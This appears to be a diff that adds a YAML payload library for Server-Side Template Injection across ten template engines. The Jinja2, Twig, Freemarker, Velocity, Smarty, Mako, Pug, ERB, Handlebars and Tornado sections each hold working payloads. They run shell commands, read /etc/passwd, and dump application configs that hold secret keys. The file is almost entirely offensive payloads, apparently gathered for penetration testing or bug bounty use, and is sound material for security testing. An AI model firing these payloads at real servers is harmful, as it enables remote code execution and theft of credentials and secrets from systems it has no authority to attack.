@@ -1,0 +1,345 @@
+# ssti.yaml — Server-Side Template Injection payloads per engine
+metadata:
+  version: "1.0"
+  sources:
+    - "AllAboutBugBounty/daffainfo"
+    - "PayloadsAllTheThings/SSTI"
+    - "PortSwigger SSTI Research"
+    - "James Kettle SSTI Paper"
+    - "HackTricks SSTI"
+  last_updated: "2026-03-27"
+
+# ──────────────────────────────────────────────
+# UNIVERSAL DETECTION
+# ──────────────────────────────────────────────
+
+detection:
+  - name: polyglot_detection
+    payload: "${{<%[%'\"}}%\\."
+    context: "Unknown template engine. Submit as input and observe errors."
+    notes: "Polyglot that triggers syntax errors in most engines. Error messages reveal engine type."
+
+  - name: math_detection_49
+    payload: "{{7*7}}"
+    context: "Test for Jinja2, Twig, or similar expression engines"
+    notes: "If output is 49, template expressions are evaluated. Narrow down engine next."
+
+  - name: math_detection_7777777
+    payload: "{{7*'7'}}"
+    context: "Distinguish between Jinja2 and Twig"
+    notes: "Jinja2 returns 7777777 (string repetition). Twig returns 49 (numeric multiplication)."
+
+  - name: math_detection_erb
+    payload: "<%= 7*7 %>"
+    context: "Test for ERB (Ruby) template engine"
+    notes: "ERB uses <%= %> syntax. If output is 49, ERB is confirmed."
+
+  - name: math_detection_freemarker
+    payload: "${7*7}"
+    context: "Test for Freemarker, Velocity, or Mako"
+    notes: "Dollar-brace syntax shared by multiple engines. Error messages differentiate."
+
+  - name: math_detection_smarty
+    payload: "{7*7}"
+    context: "Test for Smarty (PHP) template engine"
+    notes: "Smarty uses single braces. If output is 49, Smarty is likely."
+
+  - name: math_detection_pug
+    payload: "#{7*7}"
+    context: "Test for Pug/Jade (Node.js) template engine"
+    notes: "Pug uses hash-brace for interpolation."
+
+# ──────────────────────────────────────────────
+# JINJA2 (Python — Flask, Django)
+# ──────────────────────────────────────────────
+
+jinja2:
+  - name: jinja2_detection
+    payload: "{{7*'7'}}"
+    context: "Input reflected through Jinja2 template"
+    notes: "Returns 7777777 (string * int = string repetition in Python)."
+
+  - name: jinja2_config_dump
+    payload: "{{config}}"
+    context: "Flask application using Jinja2"
+    notes: "Dumps Flask config including SECRET_KEY, database URIs, API keys."
+
+  - name: jinja2_rce_mro
+    payload: "{{''.__class__.__mro__[1].__subclasses__()}}"
+    context: "Jinja2 with no sandbox or weak sandbox"
+    notes: "Enumerate available Python classes via MRO chain. Find subprocess.Popen or os._wrap_close."
+
+  - name: jinja2_rce_popen
+    payload: "{{''.__class__.__mro__[1].__subclasses__()[INDEX]('id',shell=True,stdout=-1).communicate()}}"
+    context: "After finding subprocess.Popen index from subclasses enumeration"
+    notes: "Replace INDEX with the index of subprocess.Popen from subclasses list. Runs 'id' command."
+
+  - name: jinja2_rce_os_popen
+    payload: "{{cycler.__init__.__globals__.os.popen('id').read()}}"
+    context: "Jinja2 with cycler object available"
+    notes: "Access os module through cycler's globals. Shorter than MRO chain."
+
+  - name: jinja2_rce_lipsum
+    payload: "{{lipsum.__globals__['os'].popen('id').read()}}"
+    context: "Jinja2 with lipsum function available"
+    notes: "lipsum is a built-in Jinja2 global. Access os through its globals."
+
+  - name: jinja2_rce_request
+    payload: "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}"
+    context: "Flask Jinja2 with request object"
+    notes: "Access os module through Flask request object chain."
+
+  - name: jinja2_file_read
+    payload: "{{''.__class__.__mro__[1].__subclasses__()[INDEX]('/etc/passwd').read()}}"
+    context: "After finding file class index from subclasses"
+    notes: "Replace INDEX with index of _io.FileIO or similar file class."
+
+# ──────────────────────────────────────────────
+# TWIG (PHP — Symfony)
+# ──────────────────────────────────────────────
+
+twig:
+  - name: twig_detection
+    payload: "{{7*'7'}}"
+    context: "Input reflected through Twig template"
+    notes: "Returns 49 (numeric multiplication, unlike Jinja2 which returns 7777777)."
+
+  - name: twig_version
+    payload: "{{constant('Twig\\Environment::VERSION')}}"
+    context: "Twig template to identify version"
+    notes: "Returns installed Twig version string."
+
+  - name: twig_rce_v1
+    payload: "{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}"
+    context: "Twig version 1.x"
+    notes: "Register system as filter callback, then call it. Works on Twig 1.x only."
+
+  - name: twig_rce_v2_v3
+    payload: "{{['id']|filter('system')}}"
+    context: "Twig version 2.x or 3.x"
+    notes: "Uses filter function with system callback. Simpler than v1 approach."
+
+  - name: twig_rce_map
+    payload: "{{['id']|map('system')|join}}"
+    context: "Twig 2.x/3.x alternative"
+    notes: "Map function applies system() to each array element."
+
+  - name: twig_file_read
+    payload: "{{'/etc/passwd'|file_excerpt(0,100)}}"
+    context: "Twig with file_excerpt filter available"
+    notes: "Reads first 100 lines of file. Available in some Twig configurations."
+
+# ──────────────────────────────────────────────
+# FREEMARKER (Java — Spring)
+# ──────────────────────────────────────────────
+
+freemarker:
+  - name: freemarker_detection
+    payload: "${7*7}"
+    context: "Input reflected through Freemarker template"
+    notes: "Returns 49. Freemarker uses dollar-brace syntax."
+
+  - name: freemarker_rce_new
+    payload: "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}"
+    context: "Freemarker with new() built-in available"
+    notes: "Instantiate Execute utility class and run system command."
+
+  - name: freemarker_rce_objectconstructor
+    payload: "<#assign ex=\"freemarker.template.utility.ObjectConstructor\"?new()>${ex(\"java.lang.ProcessBuilder\",\"id\").start()}"
+    context: "Freemarker with ObjectConstructor available"
+    notes: "Create ProcessBuilder instance to run commands."
+
+  - name: freemarker_rce_api
+    payload: "${\"freemarker.template.utility.Execute\"?new()(\"id\")}"
+    context: "Freemarker shorthand"
+    notes: "Shorter syntax for command running."
+
+  - name: freemarker_file_read
+    payload: "<#assign file=\"/etc/passwd\">${\"freemarker.template.utility.Execute\"?new()(\"cat \" + file)}"
+    context: "Freemarker RCE to read files"
+    notes: "Use RCE to cat files."
+
+# ──────────────────────────────────────────────
+# VELOCITY (Java — Apache)
+# ──────────────────────────────────────────────
+
+velocity:
+  - name: velocity_detection
+    payload: "#set($x=7*7)${x}"
+    context: "Input reflected through Velocity template"
+    notes: "Returns 49. Velocity uses #set and dollar-brace syntax."
+
+  - name: velocity_rce_class
+    payload: "#set($str='')#set($runtime=$str.class.forName('java.lang.Runtime'))#set($obj=$runtime.getMethod('getRuntime',null).invoke(null,null))#set($run=$runtime.getMethod('exec',''.class))$run.invoke($obj,'id')"
+    context: "Velocity with class reflection available"
+    notes: "Full reflection chain to reach Runtime.exec(). Reliable approach."
+
+  - name: velocity_rce_processbuilder
+    payload: "#set($pb=$str.class.forName('java.lang.ProcessBuilder').getConstructors()[0].newInstance(['id'].toArray()))#set($process=$pb.start())$process"
+    context: "Velocity with ProcessBuilder access"
+    notes: "Uses ProcessBuilder for more control over process invocation."
+
+# ──────────────────────────────────────────────
+# SMARTY (PHP)
+# ──────────────────────────────────────────────
+
+smarty:
+  - name: smarty_detection
+    payload: "{7*7}"
+    context: "Input reflected through Smarty template"
+    notes: "Returns 49. Smarty uses single brace syntax."
+
+  - name: smarty_rce_php_tag
+    payload: "{php}echo `id`;{/php}"
+    context: "Smarty version < 3 with php tags enabled"
+    notes: "PHP tags run raw PHP. Disabled by default in Smarty 3+."
+
+  - name: smarty_rce_system
+    payload: "{system('id')}"
+    context: "Smarty with security_policy allowing system functions"
+    notes: "Direct function call if not blocked by security policy."
+
+  - name: smarty_rce_if
+    payload: "{if system('id')}{/if}"
+    context: "Smarty with if tag that processes PHP expressions"
+    notes: "if tag can process PHP expressions including function calls."
+
+  - name: smarty_file_read
+    payload: "{fetch file='/etc/passwd'}"
+    context: "Smarty with fetch function available"
+    notes: "Reads file content. May be blocked by security policy."
+
+# ──────────────────────────────────────────────
+# MAKO (Python)
+# ──────────────────────────────────────────────
+
+mako:
+  - name: mako_detection
+    payload: "${7*7}"
+    context: "Input reflected through Mako template"
+    notes: "Returns 49. Mako uses dollar-brace syntax similar to Freemarker but runs Python."
+
+  - name: mako_rce_import
+    payload: "<%import os%>${os.popen('id').read()}"
+    context: "Mako template with unrestricted imports"
+    notes: "Direct Python import and command invocation."
+
+  - name: mako_rce_inline
+    payload: "${__import__('os').popen('id').read()}"
+    context: "Mako inline expression"
+    notes: "Single-expression RCE using __import__."
+
+  - name: mako_file_read
+    payload: "${open('/etc/passwd').read()}"
+    context: "Mako template"
+    notes: "Direct file read using Python open()."
+
+  - name: mako_rce_subprocess
+    payload: "<%import subprocess%>${subprocess.check_output('id',shell=True).decode()}"
+    context: "Mako template"
+    notes: "Using subprocess for more reliable command invocation."
+
+# ──────────────────────────────────────────────
+# PUG / JADE (Node.js)
+# ──────────────────────────────────────────────
+
+pug:
+  - name: pug_detection
+    payload: "#{7*7}"
+    context: "Input reflected through Pug template"
+    notes: "Returns 49. Pug uses hash-brace for interpolation."
+
+  - name: pug_rce_inline
+    payload: "#{global.process.mainModule.require('child_process').execSync('id').toString()}"
+    context: "Pug inline code invocation"
+    notes: "Direct require of child_process module for command invocation."
+
+  - name: pug_rce_unbuffered
+    payload: "- var x = global.process.mainModule.require('child_process').execSync('id').toString()\np #{x}"
+    context: "Pug unbuffered code block"
+    notes: "Unbuffered code (- prefix) followed by output."
+
+# ──────────────────────────────────────────────
+# ERB (Ruby — Rails)
+# ──────────────────────────────────────────────
+
+erb:
+  - name: erb_detection
+    payload: "<%= 7*7 %>"
+    context: "Input reflected through ERB template"
+    notes: "Returns 49. ERB uses angle-percent-equals for expression output."
+
+  - name: erb_rce_system
+    payload: "<%= system('id') %>"
+    context: "ERB template with system access"
+    notes: "Ruby system() runs command and returns boolean. Output goes to stdout."
+
+  - name: erb_rce_backtick
+    payload: "<%= `id` %>"
+    context: "ERB template"
+    notes: "Ruby backtick syntax captures command output."
+
+  - name: erb_rce_io_popen
+    payload: "<%= IO.popen('id').read() %>"
+    context: "ERB template"
+    notes: "IO.popen for captured command output."
+
+  - name: erb_file_read
+    payload: "<%= File.read('/etc/passwd') %>"
+    context: "ERB template for file reading"
+    notes: "Direct file read using Ruby File class."
+
+  - name: erb_rce_open3
+    payload: "<%= require 'open3'; Open3.capture2('id')[0] %>"
+    context: "ERB with Open3 library"
+    notes: "Open3 provides more control over stdin/stdout/stderr."
+
+# ──────────────────────────────────────────────
+# HANDLEBARS (Node.js)
+# ──────────────────────────────────────────────
+
+handlebars:
+  - name: handlebars_detection
+    payload: "{{this}}"
+    context: "Input reflected through Handlebars template"
+    notes: "Outputs the current context object. Handlebars is logic-less by default."
+
+  - name: handlebars_rce_prototype
+    payload: "{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push \"return require('child_process').execSync('id');\"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}"
+    context: "Handlebars with prototype access (versions before security patches)"
+    notes: "Complex prototype chain exploitation. Constructs Function from string and runs it."
+
+  - name: handlebars_helper_abuse
+    payload: "{{#each (split '/' 'etc/passwd')}}{{this}}{{/each}}"
+    context: "Handlebars with custom helpers that expose dangerous functions"
+    notes: "Custom helpers may inadvertently expose filesystem or command access."
+
+# ──────────────────────────────────────────────
+# TORNADO (Python)
+# ──────────────────────────────────────────────
+
+tornado:
+  - name: tornado_detection
+    payload: "{{7*7}}"
+    context: "Input reflected through Tornado template"
+    notes: "Returns 49. Tornado uses double-brace syntax similar to Jinja2."
+
+  - name: tornado_rce_import
+    payload: "{%import os%}{{os.popen('id').read()}}"
+    context: "Tornado template with import support"
+    notes: "Tornado templates support Python imports via percent-brace blocks."
+
+  - name: tornado_rce_inline
+    payload: "{{__import__('os').popen('id').read()}}"
+    context: "Tornado template expression"
+    notes: "Inline import and invocation in expression context."
+
+  - name: tornado_file_read
+    payload: "{{open('/etc/passwd').read()}}"
+    context: "Tornado template"
+    notes: "Direct file read using Python built-in open()."
+
+  - name: tornado_handler_access
+    payload: "{{handler.settings}}"
+    context: "Tornado web application template"
+    notes: "Access Tornado application settings which may contain secrets like cookie_secret."
